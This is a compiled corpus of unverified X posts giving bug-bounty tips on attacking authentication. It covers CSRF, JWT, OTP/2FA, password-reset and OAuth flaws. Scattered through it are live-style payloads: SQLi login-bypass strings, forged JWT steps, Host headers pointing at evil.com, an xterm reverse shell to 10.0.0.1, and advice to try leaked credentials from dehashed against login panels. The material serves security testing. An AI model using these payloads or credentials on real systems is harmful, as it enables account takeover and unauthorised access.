# X 经验语料 · auth

来源：X 公开贴子，经逐条判定后归入「经验」桶。
这些贴子给出做法/判断经验，但缺少可直接复现的完整载荷链；
与 x-<类>-*.md（技术桶，含具体载荷）配合阅读。
仅纯文本，图片与外部媒体已剥离。作者自述，未经复现验证。

> 原贴时间跨度为 2019-2026，条目均为作者自述、未经复现验证；部分技巧可能已随产品版本失效。
> 判定协议：[认证与会话](../by-type/authn-session.md) · 索引与计数：[x-corpus.md](x-corpus.md) · 同类：x-auth-1（147 条）、x-residual-auth（4 条） · 本文 484 行

- Look for online videos, demos and user manuals of the target: they sometimes expose login credentials the vendor forgot to remove.
- Read every mail the target sends (signup, invite, notification): they expose endpoints, and the auth_tokens in those links live 1–7 days and leak via the Referer header.
- Use http://dehashed.com to get leaked credentials of @site.com and try against login panels of the site you have found. You may find a working user/pass.
- For a very short-lived Bearer session token, use a Burp session-handling rule ("check session is valid" type) linked to the "Add Custom Header" extension.
- if you find a Form where you need ( Email + Date of birth + Zip code) to login , try to remove Zip code and Date of birth and send the form .
- If you're testing password reset functionality via "Forgot Your Password" but everything is handled properly, try updating your password post-authentication via your profile settings. Often times it's a different API call and may accept arbitrary user parameters.
- The CSRF token was not validated server-side: removing the whole token (name and value) still gets the request processed. Always worth checking this case.
- JSON body, no CSRF token, no CORS? Try changing the content-type to urlencoded.
- 2FA Bypass Techniques — Only Checklists
  https://medium.com/@surendirans7777/2fa-bypass-techniques-32ec135fb7fe…
  Find Secret API-Keys
  https://medium.com/cyberverse/find-secret-api-keys-22cdcc829976…
  GraphQL IDOR leads to information disclosure
  https://medium.com/@R0X4R/graphql-idor-leads-to-information-disclosure-175eb560170d…
  GraphQL IDOR → phone number disclosure (Facebook):
  https://medium.com/intigriti/how-i-got-your-phone-number-through-facebook-223b769cccf1…
- When requesting a new password reset link try to inject some html tags in the host header got one recently
  Example:-
  Host: http://redacted.com?><a href=http://evil.com
- Unauthorized endpoint returns 403, but removing the cookies and sending only the CSRF_TOKEN header grants access to the unauthorized info.
- Password reset request: if the intercepted request carries a username, numeric id or email, replace it with another user's details — it may reset their password.
- CSRF tips: delete the token; change its value to true or 1; create a new account to see whether the token is shared across accounts.
- Create two accounts, then swap account 1's id parameters for account 2's while still using account 1's session cookie (IDOR).
- So you discover a bypass for verification code. Now, here is a tip for you, try to signup an account using a company email admin@company.com then verify it using the bypass.
  You could access restricted features and other stuff (and imitate admins).
- Set Burp to replace every CSRF token with an arbitrary value, then walk the site again: some endpoints never check that the value is correct.
- Third-party login: the server may validate that the email and the token are each valid without checking that the token belongs to that email address — account takeover.
- While testing CSRF protection, don't forget to check if a valid CSRF token of user B is allowed to be used for user A.
- if you test a web application with 2FA enabled try sqli on OTP 😉😉
- JWT forgery: set the signing algorithm to "None" and drop the signature. It is case-sensitive — lowercase "none" does not work.
- OTP attempt limit: fire the checks concurrently with Turbo Intruder — a 3-attempt limit became 50+.
- JS files plus the request/response flow revealed endpoints that were then probed for authenticated data and 2FA bypass. Always read the JS.
- Authentication bypass checklist: change Cookie values to admin; register as Admin, admiN, admin<space>; check for info leaks in 302 redirects; basic SQLi on login.
- CSRF protection + password-confirmation bypass → account takeover (write-up):
- Always Check For 'state' parameter in social sign on and social account link, you can get a session replace or account takeover CSRF
- Send the request with the modified JWT and check the response: if the backend performs no algorithm check, it is accepted.
- While pentesting JIRA/Confluence webapps, if you ever come across this warning, simply add:
  X-Atlassian-Token: no-check in the request body and that would probably bypass this warning.
- 2FA bypass via CSRF: register two accounts, disable 2FA as the attacker and save the generated CSRF PoC as .HTML, then fire it while logged in as the victim in a private browser.
- Password reset would go thru with a temporary Bearer Authentication header.
  This temporary Bearer Authentication also had full admin access to the web application.
  Be sure to check any/all temporary credentials for proper authorization limitations.
- Directory brute-force login pages when allowed: they sometimes contain pages that are not protected.
- Test s3 mis-configuration like list, read, delete and ACL without AWS-CLI,
  Just login to your normal aws account (not business), & open URL "https://console.aws.amazon.com/s3/buckets/<bucketName>".
- Found admin panel at /admin
  - Tried a few passwords, noticed that the "incorrect" response was super fast
  - Found that the login was checking against a plaintext password in the javascript
  - Access to admin tools
  Always check the javascript.
- 2FA bypass tip 2
  Try forget password ,get link from your email,change password sometimes you will directly login in to webapp without 2FA code
- OAuth: a missing `state` parameter means CSRF; if it is present, try removing it or randomizing its value.
- Leak hunting {api keys, tokens}:
  1- collect js, html, json responses
  2- grep them locally with regex — or run @pdnuclei on the fly
- Try accessing endpoints directly that require users to sign in. Some applications might not redirect you to the login page.
  Read the JS files :)
- Broken access control (Jason Haddix, Bugcrowd University):
  - Create 2 accounts, log out, log in as the first and retry requests with the second account's GUID
  - Search other endpoints or web services that might leak other UIDs
- On a "forgot password" page, apply the reset-flow tips below.
- Always check the randomness or predictability of tokens like session tokens/anti-csrf token and identifiers like UUIDs using Burp Sequencer. It may give you an idea of randomness and further research may allow getting hold of some high priority issues.
- While logging on your target check for token parameter , see if you bypass the validation and make target redirect .
  Use random strings in the token field, or try undefined / zdefined / zndefined.
- Slides on regex in bug hunting: https://speakerdeck.com/harshbothra/having-fun-with-regex…
- Compare the requests made with 2FA enabled and disabled — the difference often reveals a bypass.
- Blind XSS belongs in registration and contact forms — it can fire on the admin account (one fired on Red Bull's user_management). Stored XSS also landed on icloud.com.
- MFA bypassd
  1.enter 3, to 4 wrong otp and then try to redirect to http://site.com/mfa >> http://site.com/dashboard bypassd
  2.enter 3, to 4 wrong otp and then try to enter .. bypassd
- CSRF token bypass, in order:
  1. Try removing anti-CSRF headers from the request.
- SQLi authentication bypass payloads:
  username: '--' / "--"
  password: '--' / "--"
- Always try to log in while removing your username/email and sending only a password. If you're lucky, the backend will take the password alone, check it against the database, and log you into the first matching account, which leads to account takeover.
- 2FA bypass techniques with quick test steps (mind map):
  https://mm.tt/1736437018?t=SEeZOmvt01…
- OAuth test case: sign up with a Facebook account that has no email linked.
- Login=> entered victim@gmail.com=>attacker's password.
  Logged into the victim's account.
- Token analysis: extract endpoints from .js files with SecretFinder.
  https://github.com/KingOfBugbounty/SecretFinder…
  rush -i urls.txt ‘python3 http://SecretFinder.py -i {} -o cli’
- Password reset token issues:
  1. Weak cryptography in password reset tokens — check the token's randomness and compare it against known schemes.
  Ref: https://medium.com/bugbountywriteup/weak-cryptography-in-password-reset-to-full-account-takeover-fc61c75b36b9…
- JWT exploitation walkthrough (video) from CTerms.
- If you find some admin login panel, always test for defaults credentials, this will help you a lots: https://github.com/ihebski/DefaultCreds-cheat-sheet…
- Newspaper site as target: test paywall bypass, login/register/password reset, IDOR between users, XXE via SVG if image upload exists, CSRF on important functionality, blind XSS.
- 2FA bypass by reusing a leaked session on duplicated post-login requests. After the fix, retesting showed sensitive endpoints still reachable with that session.
- On GitHub, don't only look for tokens/keys — look for old endpoints; they usually lack IDOR protection.
- Protection Bypass
  Try to remove token value from body or cookie.
  For example: token=aeGbs124&new=1
  Replace it to:
  token=&new=1
  This will set token to null, and sometimes bypass protection.
- OTP brute-force via rate-limit bypass: the OTP limit at a forgot-password endpoint was evadable, opening account takeover.
- 1.Capture the JWT.
  2.Change the algorithm to None.
  3.Change the content of the claims in the body with whatever you want e.g.: email: attacker@gmail.com
  4.Send the request with the modified token and check the result
- 🏃 Baserunner: a tool for exploring & exploiting Firebase datastores
  * Test R/W access to collections as unauth user
  * Dump the full datastore
  * Test access across priv levels (auth bypass)
  * Explore data/actions not exposed thru UI
  https://iosiro.com/blog/baserunner-exploiting-firebase-datastores…
JSON Reset password account takeover
  {
   "email":"victm@victmemail.com"
  }
  try
  {
   "email":[
  "victm@victmemail.com",
  "attacker@attackeremail.com"
  ]
  }
  The victim and attacker receive the email to reset the victim password. (not guaranteed to work)
- Password reset test cases for web apps:
  https://github.com/imran-parray/Web-Sec-CheatSheet/blob/master/password_reset.md…
- Quick Tip: Always Try sending post request if you see Django Login Portal.
Session variable overloading is when a sessionID is used for multiple purposes, potentially allowing attackers to access pages in an unforeseen order ...
  One can test for this by identifying session variables and where they are valid 😍
  https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/08-Testing_for_Session_Puzzling…
- -Tip 3/31-
  -2nd part-
  [3] download JS and look for strings like "create_user"/"register"; you might find AuthN API EPs and use them to register directly.
  [4] use http://bugmenot.com or http://login2.me to find credentials
- Password reset OTP (6 digits): brute force can be fully blocked — every attempt returns 400 with identical length, so look for a logic flaw instead.
- Try XSS in the login inputs (username and password fields).
- -TIP 21/31-
  B2B apps often provide an "impersonate user" feature to org admins.
  [1] Create an org admin user
  [2] Learn the API call to "impersonate_user"
  [3] Try to delegate to a user from a different org
  [4] Might lead to a full account takeover
- Mindmap of test cases for the "Forgot Password" functionality:
  XMind Link:
  PDF Link: https://drive.google.com/file/d/1nwyiemzdeg13S8l-pIHPOsKKVfuTzxbz/view?usp=sharing…
- CSRF on the password reset page → account takeover.
  Check this out: https://faiyazhacks.medium.com/bugbounty-c-s-r-f-at-password-reset-page-93bd440cee61…
- On a basic/NTLM auth login, submit a 20-char and then a 2000000-char credential and compare timings (observed 3s vs 3min).
- WHERE TO LOOK FOR XXE?
  1-Functionality that parses SVG files
  2-Functionality that parses sitemap.xml files
  3-SAML Authentication
  4-HTML parsing
  5-SOAP APIs
  6-XML APIs
- Try access /admin path without follow redirects {tampering}:
  ~http://target.com/admin –> HTTP 302 (redirect to login page)
  ~http://target.com/admin%20/ -> HTTP 200 OK
  ~http://target.com/%20admin%20/ -> HTTP 200 OK
  ~http://target.com/admin%20/page -> HTTP 200 OK
- Host header injection / redirect:
  Host: http://bing(.)com
  Most reports are closed as N/A, so try:
  X-Forwarded-Host: http://bing(.)com
  Or aim for password reset poisoning for higher severity.
- Tips for att csrf:
  1- if you see anti csrf token don’t stop and check exploit with token
  2- try csrf in critical functions
  (Email change)
- If you have any login page or panel which do not have any other functionalities other than login then try to fuzz the target with this wordlist
  https://github.com/basubanakar/login-panel-wordlist…
- One that works often: Just get a valid Csrf token from the application through the main webpage (unauthed). Many times developers don’t tie the csrf token to a session they just check to see if it’s a valid one. Easy to instrument in JavaScript.
- 2FA vulnerability in Microsoft (write-up):
  https://cysrc.com/blog/microsoftVulnerabillity…
- OTP hunting applies to email/phone confirmation, password reset and OTP login:
- OAuth bypass via response manipulation (match & replace in Burp Suite).
- IDOR: Insecure direct object reference
  Tips:
  1: In forgot Password Link , if UID/ID parameter there , try to change the Numbers/UID, you might Either get the other User account password control or it will disclose Sensitive information of other user
- In the dev environment, right-click and inspect the HTML context — keys leak there:
  POSTGRESQL_URI":"postgresql://user:password@*********http://1.rds.amazonaws.com:5432
  "CONTENTFUL_ACCESS_TOKEN":
  ROLLBAR_CLIENT_ACCESS_TOKEN":
  "SCANDIT_LICENSE_KEY":
- 1 click ATO:
  If i capture the reset password request , In body request i have a parameter in content-type of json:
  {“email” : “Evil@attacker.com”}
  Parameters sent in the request:
  {“email” : “Evil@attacker.com” , “Url” : “https://Evill.com/test/”}
- GraphQL introspection can return the full backend schema while queries still fail with “you don’t have permission” (no JWT token).
- TIP:
  Extracting CSRF token via HTML injection:
  This technique utilizes HTML injection vulnerability using which an attacker can plant a logger to extract the CSRF token from that web page:
  <form action=”http://test.com/acquire_token.php…”></textarea>
- Test credentials found in a target org's GitHub repo must be validated — even a “test” token can be live.
- if you face 2FA endpoint on a web application built over GraphQl try graphql batching attack . You can send thousand of OTP in one request
- Reflected XSS in the DSL-AC55U Asus router login page; the payload executes on two different endpoints.
- Authentication bypass using a root array: change the body from
  {"email":"test@gmail.com","password":"test"} to:
  {"root": {
   "password": "test",
   "email": "test@gmail.com"
  }}
  You end up logged in as admin.
- If the app uses an authenticity_token to check the user's access level, send a token from another page when access is denied — it can bypass the restriction (broken access control).
- POC
  1- signup
  2- account need verify your email
  3- the page have function to resend message to active
  4- request the resent
  5- check burp and see path : /resend-activation/92220261/
  6- when i change id i can see other emails
  7- so this bug disclose 92220261 email
- Check for CSRF on sensitive endpoints such as an API token change.
- Put the HTML injection payload in the signup page and check the email that arrives.
- nginx + tomcat: try ..;/manager
  check robots.txt; on a 302 fuzz for hidden directories; on a login panel try admin:admin
- Sign up with Google auth, set the name to <h1>test</h1>, then invite another user into the org — the payload is reflected into the victim's email.
- CORS with broken validation disclosed email, JWT and accessToken. Client-side bugs are rarely closed as duplicates and can turn out critical.
- Always check the registration page for hidden endpoints: learn the app first, then add hidden parameters.
- If you find a token try it everywhere that requires access, if you’re lucky you might get admin privileges.
- Nuclei output leaked a password: https://site .com [3$ytrej1@1]
  View-source then revealed the login URL, password and username.
- Burp extension like Autorize is great for automating auth bypass, but don’t rely on them for ID-related BAC issues. They lack the context to fully understand what changed with responses & still require manual review.
  Look for these issues manually✅
- JWT cracked because the developer used a well-known secret key:
  https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list…
- Check the target's YouTube videos: an endpoint can be cached together with a user token.
- Even with test credentials, submit the new business signup and demo forms — stored blind XSS can land there days later.
- CSRF token bypass:
  - change a single character
  - send an empty token value
  - replace the token with one of the same length
  - switch POST to GET
  - remove the token entirely
  - use another user's valid token
  - try to decrypt the hash
- Bypass Captcha (Google reCAPTCHA)
  1 . Try changing the request method, for example POST to GET
  POST / HTTP 1.1
  Host: http://target.com
  ...
  _RequestVerificationToken=xxxxxxxxxxxxxx&_Username=daffa&_Password=test123
- Chain: self-XSS + CSRF + OAuth → account takeover.
- Set browser cookies manually for the @zaproxy Ajax crawler when the login page has a robot check:
  https://blog.knas.me/posts/zaproxy_cookies/…
- Look for SSRF in:
  - webhooks
  - file upload via URL,
  - document and image processors,
  - link expansion, and
  - proxy services
- Look for sensitive info inside JS files with keywords: authorization, authentication, token, password=, username, value=
- When testing for IDOR, if you get a 403 when querying an api endpoint check what kind of authorization token is being implemented.
  JWT? Cool. Use http://jwt.io to decode the token, modify the id parameter and replay the request.
- Employees Email, Information, Api Actions Performed Because of Leaked Api_Key and Access_Token Through Github Repositories
  As always,Thanks for @Bugcrowd Team for Thier Great Work
  Write_Up will be published soon.
- Github
  target[.]my[.]salesforce[.]com password
  you can find a passwords
   but when you try login its will ask for 2fa
  how you can bypass that and get critical find
  1/2
  Happy hunting all ♥
- Response manipulation at login: change a 4xx response to 200 — here it gave access to any user's purchase orders.
- 📃 Possible information leaks in the PhpMyAdmin directory ( 1/3 )
  If you find the PhpMyAdmin login panel but can't guess the password, don't forget to fuzz the /phpmyadmin directory, as this can lead to easy leaks of critical data.
- BXSS in a contact form led to account takeover on the admin panel.
  BXSS finder: https://bxsshunter.com
- Misconfigured Jira Service Desk: change /servicedesk/login to /servicedesk/signup — self-registration gives access to the internal-only dashboard and its data.
- Check the target org's employee GitHub accounts for leaked ghp_ tokens, then check the token's access to each repo of the main organization.
- On a large scope, view the page source of every login page: API keys are often left there.
- On payment/credit-card tokens: remove or edit the value, flip it between string and number, and watch how the app behaves on unexpected types.
- Testing SAML: try XML entity injection in SAML attributes/payloads and signature validation bypasses.
- Check how the server stores sensitive data: here the login data was saved incorrectly server-side.
- A JWT token inside a URL leaked the victim's PII. Always analyze URLs and endpoints for sensitive JWT tokens.
- A leaked API key with only [read] permission still gave sensitive data exposure: find more endpoints to request internal company information.
- A reported 2FA bypass was re-triaged by the program as OAuth misconfiguration / account squatting.
- Sanity token found in a JavaScript file; it was read-only (like a public API key) and the documented requests returned nothing sensitive on their own.
- CSRF bypass attempts:
  - Convert POST request to GET request
  - Try using the old tokens in the new request
  - Leave the token with a blank string
  - Removing the token parameter totally
  - Remove anti CSRF headers from the request
- AWS S3 presigned URL / POST policy fields to test:
  "url"
  fields"
  "key"
  "x-amz-algorithm"
  "x-amz-credential"
  "x-amz-date"
  "x-amz-security-token"
  "policy"
  "x-amz-signature"
- JSON login page: test blind SQL injection directly in the username and/or password fields.
  Payload injected in the username field:
- When you hit an admin login, always check whether a register endpoint exists on the same app.
- 2FA and email confirmation bypassed with "000000" (program triaged it as informative).
- Xterm reverse shell — connects back to 10.0.0.1 on TCP port 6001:
  xterm -display 10.0.0.1:1
  To catch the incoming xterm
  Xnest :1
  authorise the target
  xhost +targetip
- Confluence origin IP reachable directly, bypassing the Okta-only SSO; weak credentials then worked against the IP.
- Password reset that sets a new password and mails it out without verification lets you change anyone's password.
- SQLi authentication bypass:
  username:’ — ‘/” — “
  password:’ — ‘/” — “
- 1- found port 8080 open
  2- admin panel login page
  3- test:test
  4- access to admin panel
- Default login credentials on a web console (test : test); manual checking still finds these.
- Manipulate passwordless one-time login links so they can be reused against victim accounts.
- CSRF (address change, P4): with X-Csrf-Token linked to the Cookie, setting both values to 1 was accepted as valid.
- Try every CSRF token protection bypass. Read the API documentation and test IDOR on every endpoint.
- If you ever see an action being completed in the URL, without any CSRF token, here's a tip: Check if you can post an image on the website or even set your avatar to a remote URL, then make it the URL of the action. Whoever views the image will execute the action.
- Chain: host header injection → password reset link poisoning → XSS → account takeover.
  https://medium.com/@TheeEclipse/how-i-chained-host-header-injection-to-password-reset-link-poisoning-to-xss-and-account-takeover-c5acad3acbb7…
- Anonymous FTP login on the target domain exposed many files and data. Check other open ports for similar.
- Exported activity that calls a WebView → JWT taken from insecure SharedPreferences storage → account takeover. Check the WebView implementation and data storage.
- Account takeover with an uppercase character in the email (1/2):
  Sign up with an existing address (existing@email.com) → "User already exists."
- Google-account registration bypass: register with Google sign-in on a site whose login is Google-based, then compare the created account with an existing one.
- 2FA bypass method that started application-specific but holds as a general test case.
- At password reset pages always try manipulating HOST header, you might get lucky and find that the password reset URL contain your own host instead of the original domain name.
- 1-click mass account takeovers via CSRF. Always check the mobile version of an app: it is often misconfigured and missing protections.
- Bypassed the allowed-countries check on the subscription signup page, which granted all features for free.
- Chain: web cache deception → steal CSRF token → application-wide CSRF → account takeover.
  The app fixed all cache issues in the app by using private directive in all sensitive pages.. [1]
- After deleting an account, replay API calls with the old JWT: here the token stayed valid and could create and read API keys under the deleted user.
- Autorize plugin in Burpsuite, how to strip away the Authorization: Bearer <token> header to test for unauthenticated requests ?
- Reflected XSS with no sensitive data on its own, escalated to account takeover:
- CSRF authentication_token bypasses:
  1. Remove the whole ‘token’ param and value, then send the request — a very common misconfiguration.
- 1- create 2 accounts (A , B )
  2- reset password for account A
  3- follow the regular flow and study the link sent to your email
  The link carries a mail param: https://hatab.com/login/change/?hash=blabla&mail=A%40gmail.com…
  4- change the mail value to account B
- IDOR in Reset Password
  When the user reset his password the application make an API request to make sure that username exists. If exist, it will come back with Personal Identifying Information (PII) in the response [Full name,Email,Phone number].
- Internal page registration Bypass ⚙️
  registration page that only allows @company.com addresses? try to sing up with hunter@company.com.burpcollaborator.net and see if it sends you an SMTP request
- XSS plus unauthorized dashboard access; found by fuzzing login pages.
- Clickjacking pays off on all pages that perform sensitive actions, not only login pages.
- Admin login: submit any credentials and flip the response from 422 to 200 OK — it logs into an empty panel, so verify a real server-side session before reporting.
- When mining .js files for APIs, tokens, usernames and passwords, also check any Google Form link found: a misconfiguration can let you edit the backing document.
- If login is validated by a third party, check that integration for misconfiguration (e.g. NTLM info disclosure; accepted as P3 on a Microsoft program).
- POST /profile with JSON param alias = victim's email → the victim's password reset mail is delivered to your inbox instead.
- SXSS that cannot be chained to ATO or CSRF: look for an endpoint returning lots of PII plus an auth token, then craft a payload that exfiltrates it to your server:
- Account takeover via the secondary-email field in password reset: supply an additional secondary email and try these payloads.
- Session cookies not invalidated after password reset usually come back as duplicates; instead report the CSRF token not expiring — an easy P4/Low.
- Service that offers no self-registration: the registration endpoint still accepted extra parameters (firstName, lastName), and afterwards login worked.
- SQLi authentication bypass — test both fields, username and password:
  username:'--'/"--"
  password:'--'/"--"
- A leaked Authorization: Bearer token granted read access to internal/private repo content and even upcoming updates — read-only, but still internal data exposure.
- Test Newsletter Signup forms for SQLi and stored XSS. Signup forms on internal pages are often separate from the homepage ones and unmaintained — that copy was the vulnerable one.
- Basic auth bypass: try cancelling the auth dialog 3-4 times.
- OTP code returned in the JSON response: try flipping the flag, {"Otp":true}, to skip verification.
- Source code review pays off on higher-level components: admin panels and admin login systems.
- 2FA rate limit: inject X-Forwarded-For to bypass it (the post spells it 'X-Forwared-For').
  https://medium.com/@Rzizah/2fa-bypass-via-bypassing-the-ratelimit-5f5a36774830…
- WordPress: wp-login.php has no login rate limit by default — check whether the target added one.
- Top 5 places to look for SSRF:
  • Profile image loaders
  • External file or data processors (like webhooks)
  • PDF Generators (through HTML Injection)
  • Host header injections
  • File uploads (via XML for example)
- /token endpoint with basic auth: try the default client:secret config:
  "Authorization: Basic Y2xpZW50OnNlY3JldA=="
- CSRF bypass when the target sends JSON without an anti-CSRF token: change the Content-Type from application/json to text/plain and see if the request is still accepted.
- Login page with no registration available: fuzz it — it may reveal restricted areas where you can manage data.
- JWT signed with an empty-string secret: the server accepted the empty secret as the key, so the signature validated → admin access.
- /backend/login returns 302 on the domain but 200 on the origin IP: reach the backend admin panel there and log in with the default password. Find the origin IP, then fuzz it.
- Username enumeration on password reset, before trying default credentials: 'admin' and admin@comapny.com answer "not match to our database", but admin@comapny.corp receives the reset mail — try alternate corp/TLD domains.
- IDOR in password reset: the username-existence check API returns PII (full name, email, phone number) for whatever username is supplied.
- ATO via email confirmation also applies to password reset — the same flaw sometimes yields two ATOs at once.
- The Google Authenticator secret key was returned in the request body alongside the code, so a new authenticator could be enrolled. Look for secret keys and QR codes (data:image) in requests and responses.
- OTP bypass by manipulating server responses in password reset and 2FA (partial account takeover). If signup fails, try response manipulation.
- Check whether authenticated endpoints can be reached without verifying MFA.
- OTP bypass and user-registration blocking write-up (registration OTP was the ATO path):
- 2FA/auth bypass: try the browser back button after the challenge (triaged on HackerOne).
- OAuth CSRF via flawed implementation of the state parameter (write-up):
  https://medium.com/@cyberpro151/oaauth-based-csrf-exploiting-the-flaw-in-implementation-of-state-parameter-36bfae68aa65…
- Login page source revealed the AWS S3 bucket that static files were loaded from; read/write permission on that bucket allows planting a JS keylogger.
- Login-form SQLi: don't give up after the first payload — the server-side query decides. This one gave auth bypass:
  admin')&password=')+or+30>10/*
- Password reset poisoning: if changing the Host or X-Forwarded header fails, add a second Host header with a trailing space.
- 2FA bypass → account access → crypto moved without the victim authorizing the transaction.
- SAML Raider (Burp extension) covers most SAML bug classes; setup and usage tutorial: https://buff.ly/3Nm8XSv
- Stored XSS → account takeover: put the payload wherever data is stored and later rendered.
- Review JS files manually — tools miss keys; look for tokens starting with live_. A leaked GoCardless key exposed customer details, bank info, billing requests and payments.
- OTP testing: check the page source — the OTP is sometimes revealed in the code.
- After the first stored-XSS account takeover lands, replay the same payload in other similar input points.
- Use a valid code from another account to test 2FA/OTP: some backends only validate the code itself, not that it belongs to that account.
- Spring Boot Actuator: the /actuator endpoint exposed a downloadable heap dump holding AWS creds, auth tokens and JWTs.
- /core endpoint served a core dump holding DB creds, JWT secrets, AppIDs, auth tokens and HTTP cookies.
- Hit a rate limit? Let the brute force run and check response messages. Different responses can reveal the right OTP.
  Example:
  1234 → "Invalid sign-in request" → Wrong OTP ❌
  4556 → "Exceed max attempts" → Right OTP ✅
- page=EmployeeLogin&u=admin&p=zKkMHD&r=1 — adding r=1 grants admin-role login even for an account invited as Intern. The hidden param was spotted by reading Burp History responses, without a hidden-parameter tool.
- Leaked JWTs for internal APIs → unauthorized access to APIs returning mass PII (2,637,711 users in this case).
- JSON-based bypass (ii): Flash + 307 redirect. The Flash file redirects to POST /email/change with email=evil@com via 307, bypassing the token check.
- Check token transmission: is the token sent over HTTP or to a third party? Check whether GET /token leaks the token over plain HTTP.
- Single-use token header: try editing the token value — a header token valid for only one request may still be accepted when tampered.
- MFA enrollment asked for an OTP code; the check was bypassed at that step.
- Profile update accepts an email value edited in Repeater (front-end validation only): pointing it at the admin's address locked the admin account out.
- HTML injection used to inject a fake phishing login page.
- Login page running an outdated jQuery with known CVEs (report was closed as informational).
- Login rate-limit bypass: append %00 after the email when testing rate limits (old but still works).
- Ant Media Server signup page allowed creating an admin account → full admin access. Always check the register page.
- SVG file upload → XSS. To prove session hijacking as PoC, upload the KNOXSS SVG payload.
- BAC: admin → superadmin escalation, plus evicting the other superadmins.
- Don't ignore "Resend Code" in password reset: capture that request and check for a code leak. Here the reset was also bypassed via response tampering.
- OTP bypass by changing "false" to "true" (two different apps). Don't skip the simple checks — the backend decides.
- Hidden admin endpoint found in source code; replayed with a normal user's cookies and CSRF token it deleted any account on the platform.
- Account enumeration: determine whether a given account has 2FA enabled (Instagram case).
- Re-test favourite programs after they ship updates: this 2FA bypass appeared with a new 2FA feature and was the third one accepted on the same domain.
- Sign-up form testing (thread 1/6): don't stop at XSS/SQLi — the critical bugs sit in business logic and subtle flow manipulation.
- 1- Test duplicate account registration. 2- Null byte %00 to bypass checks. 3- Poor input validation → full account takeover.
  https://medium.com/@nayefhamouda/full-account-takeover-0-click-ato-my-story-with-a-critical-vulnerability-6e7ff9a9eaa5…
- Default credentials to try on login pages (email used as its own password):
  test@comp.com / support@comp.com / sales@comp.com
- Read JS files fully, not only for tokens and keys: spot base64 (often a token), decode it, and analyze any encoded text.
- Auth bypass: try a blank field, a random OTP, or common OTPs. This site let an attacker bypass any registered user's authentication with a random 4-digit OTP.
- Password-reset poisoning: inject a Collaborator domain into headers with the Burp FakeIP extension → account takeover.
- Apache Airflow: use flask-unsign to recover the Flask secret key, then forge a new JWT for admin.
- Credentials leaked in responses cover admin accounts, service logins (Telnet/FTP/SMB/console), camera access, internal IPs and management interfaces. Read what the response returns after tampering with the request.
- OAuth redirect_uri is filtered in the normal email/password flow: check its behaviour when logging in through third-party portals.
- AI-product bug classes to test:
  - Cross-Session Memory Injection
  - Cross-Model Escape Chains
  - AI-API Misbinding
  - Hardware/Edge AI Model Extraction
  - Vector DB Poisoning
- 🔒Unauthenticated XSS in Palo Alto GlobalProtect (CVE-2025-0133) 🌏
  Impact: Steal authcookies to hijack VPN sessions.
  Tip: Test XML/SVG namespaces in VPN gateways; they often bypass HTML filters.
- Basic Authentication returning 401: try these default credentials:
- Sometimes cookie paths leak hidden endpoints.
  Set-Cookie: session=abc; Path=/hidden-admin-2024
  Check your cookies. Access that path. Find bugs.
- OTP → account takeover: always try response manipulation when an OTP is involved.
- Checklist: does the session stay valid after an admin is removed? Does a double-extension upload get through? Has the email service had a recent zero-day?
- 2FA: resubmit an old OTP later — check whether it is still valid after time passes.
- Remove "signout"/"logout" from the wordlist when fuzzing with a hijacked session token: the request just logs the victim out.
- Add /elfinder to your wordlists: a web-based file manager exposed with zero authentication gives full file access.
- Web cache deception exposing token information (HackerOne case):
- 2FA bypass: look for old login pages in web.archive.org — they are sometimes unprotected, and can also yield XSS and open redirects.
- Current meta: MCP servers, GraphQL, and chaining CORS misconfiguration with other low-severity bugs (an MCP server auth bypass was a duplicate).
- JS files: a Supabase JWT key [eyJ...] led to customer PII, official-account credentials, chat logs, internal employee data and the DB schema (closed as known issue).
- 2FA bypass is not only about breaking the OTP — the weakness is often in the implementation. Common paths to test:
- Abandoned signup flow: try logging in anyway — the half-created account may already have access. Related finding: AEM .css bypass.
- JWT hunting: decode every token and check alg, kid, jku, x5u, exp, aud, iss. Most findings come from incorrect validation, not from cracking — how the server verifies matters more than the payload.
- Session fixation: grab a pre-auth cookie, then log in with it still set. If the server doesn't rotate it after login, an attacker can pre-seed a victim's session ID and take over once they authenticate. Test every login flow.
  https://owasp.org/www-community/attacks/Session_fixation…
- Chain: unauthenticated OAuth registration endpoint → full account takeover:
  https://medium.com/@divakarvasani3938/how-i-chained-an-unauthenticated-oauth-registration-endpoint-into-full-account-takeover-a6bc41e93a62…
- Hidden signup page + 3 chained bugs → super admin:
  https://medium.com/@abinsecurityresearcher/i-found-a-hidden-signup-page-and-chained-3-bugs-to-become-a-super-admin-42326159cb50…
- JSON API password reset: two emails separated by \n, and both receive the reset link.
  {"action":"reset-password", "email":"accA@mail.com\naccB@mail.com"}
- For 401 auth use ncrack, but admin panels usually have no ready-made script, so write custom tooling. If login-page auth is limited, look for API auth — that path is often weaker.
- Never assume there is only one way to authenticate to an API: modern apps expose many AuthN endpoints (`/api/mobile/login`, `/api/v3/login`, `/api/magic_link`). Find and test all of them.
- MindMap index (1/2): 1. Forgot-password vulns, 2. XML attacks, 3. 2FA bypass techniques, 4. Android PT checklist.
- JWT → account takeover outline: what a JWT is, what it looks like, and how to hunt its weaknesses (thread).
- Google Merchant Center: the OTP verification request could be made to send the code to http://attacker.com (SMS to anyone).
- Verbose admin-login errors revealed which accounts were valid: “AdminTest” was identified, then authenticated with password “Test123”, exposing PII (P1).
- returnTo= in a login URL: append javascript:alert(1), log in, and the XSS fires.
- 0-click account takeover in a password-reset flow: no user interaction, silent reset via /orchestrator/v1/password_reset/start (Remitly, AUTH-3243).
